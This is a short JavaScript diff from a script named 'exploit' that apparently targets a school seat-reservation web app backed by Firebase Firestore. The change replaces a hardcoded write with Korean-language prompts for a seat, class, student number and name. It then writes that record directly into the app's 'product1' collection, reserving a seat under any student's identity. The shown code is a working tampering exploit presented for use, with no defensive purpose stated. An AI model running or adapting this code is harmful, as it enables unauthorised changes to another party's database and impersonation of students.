@@ -43,18 +43,28 @@ const exploit = {
         db = firebase.firestore();
         ymd = window.location.search.substring(6, 14);
         time = window.location.search[20];
-
-        var save = {
-            A1: ['2', '20', 'ㄷ', 'ㄹ'],
-            _MAP: {
-                '1124': 0
-            }
-        };
-        db.collection('product1').doc(ymd+'-'+time).update(save);
-    
-        setTimeout(() => {
-            location.reload();
-        },500);
+        var zali = prompt('자리를 입력하세요...');
+        var _class = prompt('표시가 되기를 원하는 반을 입력하세요...');
+        var num = prompt('표시가 되기를 원하는 번호를 입력하세요...');
+        var name = prompt('표시가 되기를 원하는 이름을 입력하세요...');
+        if(num.length == 1) {
+            num = '0' + num;
+        }
+        var stunum = _class + num;
+        var bool = confirm('자리 : ' + zali + ', 학번 : ' + '1' + stunum + ', 이름 : ' + name + ' 이(가) 맞습니까?');
+        if(bool) {
+            var save = {
+                [zali]: [_class, num, name, 0],
+                _MAP: {
+                    '1124': 0
+                }
+            };
+            db.collection('product1').doc(ymd+'-'+time).update(save);
+        
+            setTimeout(() => {
+                location.reload();
+            },500);
+        }
     },
 
     setPassword : function() { 
